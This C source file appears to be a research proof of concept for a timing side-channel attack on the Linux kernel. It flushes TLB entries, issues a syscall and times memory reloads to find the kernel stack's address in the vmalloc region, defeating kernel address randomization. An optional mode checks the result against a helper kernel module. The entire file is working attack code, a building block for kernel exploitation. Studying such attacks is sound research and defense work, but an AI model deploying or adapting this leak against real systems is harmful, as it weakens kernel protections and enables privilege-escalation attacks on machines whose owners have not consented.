#include "utils.h"
#include "cacheutils.h"
#include "msg_msg.h"
#include "coarse_grain_leak.h"
#define VALIDATE
#ifdef VALIDATE
#include "ulkm.h"
#endif
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include "tlb_flush.h"

#define VMALLOC_START 0xffff980000000000
#define VMALLOC_END   0xffffd7ffffffffff
#define VMALLOC_STEP (1<<30)
#define HIST_SIZE 80
size_t stack;


/**
 * Does the page return hits after calling syscall, and does it have unmapped guard pages after it
 */
size_t hit_flush(size_t addr, size_t tries)
{
    size_t time;
    size_t time_n1;
    size_t times[tries];
    size_t times_n1[tries];
    prefetch2((void*)addr+(1<<12));
    prefetch2((void*)addr+(3<<12));
    /* leaking */
    for (size_t i = 0; i < tries; ++i) {
        flush_tlb_targeted_4k(addr);
        syscall(-1);
        asm volatile("lfence");
        asm volatile("mfence");
        time = onlyreload(addr);
        time_n1 = onlyreload(addr+(1<<12));
        asm volatile("lfence");
        asm volatile("mfence");
        
        times[i] = time;
        times_n1[i] = time_n1;
    }
    qsort(times, tries, sizeof(size_t), comp);
    qsort(times_n1, tries, sizeof(size_t), comp);
    time = times[tries/4];
    time_n1 = times_n1[tries/4];
    return (time <= THRESHOLD && time_n1 >= THRESHOLD2);
}

int main(void)
{
    printf("[*] start\n");
    set_limit();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_to_core(0);
    init_tlb_flush();

    /* warump */
    for (volatile size_t i = 0; i < (1ULL << 30); ++i);

#ifdef VALIDATE
    lkm_init();
    lkm_stack_leak((size_t)&stack);
    size_t vmalloc_base;
    lkm_vmalloc_base_leak((size_t)&vmalloc_base);
    printf("[*] vmalloc_base   %016zx\n", vmalloc_base);
    printf("[*] lkm_stack_leak %016zx\n", stack);
    printf("[*] hit_flush[lkm_stack_leak]        %s\n", hit_flush(stack, 100) ? "hit" : "miss"); /* should be miss */
    printf("[*] hit_flush[lkm_stack_leak+0x3000] %s\n", hit_flush(stack+0x3000, 100) ? "hit" : "miss"); /* should be hit */
    printf("[*] hit_flush[lkm_stack_leak+0x7000] %s\n", hit_flush(stack+0x7000, 100) ? "hit" : "miss"); /* should be miss */
#endif

    /* try to detect when we've left the vmalloc area by counting how many unmapped pages we've found */
    unsigned memory_hole = 0;
    unsigned max_hole = 0;
    size_t addr = vmalloc_leak(50);
    printf("[*] found vmalloc, trying [%016zx %016zx]\n", addr, VMALLOC_END);
    for (size_t fine_addr = addr; fine_addr < addr+(4ULL<<30); fine_addr += 0x4000) {
        size_t pot_stack = fine_addr + 0x3000;
        size_t found = hit_flush(pot_stack, 100);
        if (found) {
            if ((pot_stack & 0x1ff000) != 0x1ff000) {
                printf("[*] found addr %016zx, stack: %016zx\n", pot_stack, stack + 0x3000);
#ifdef VALIDATE
                if (pot_stack == stack + 0x3000)
                    printf("[+] success\n");
                else
                    printf("[!] fail\n");
                return pot_stack == stack + 0x3000;
#else
                return 0;
#endif
            } else {
                printf("[*] disqualified addr %016zx based on alignment 0x1ff000\n", pot_stack);
            }
        }

        if (hit(fine_addr, 4)) {
            memory_hole = 0;
        } else {
            memory_hole++;
            if (memory_hole > max_hole + 8)
                max_hole = memory_hole;
            if (memory_hole > 65000) {
                printf("[*] aborting because we haven't seen a mapped page in 1GB\n");
                return -2;
            }
        }
    }
    printf("[*] not found\n");
    return -3;
}
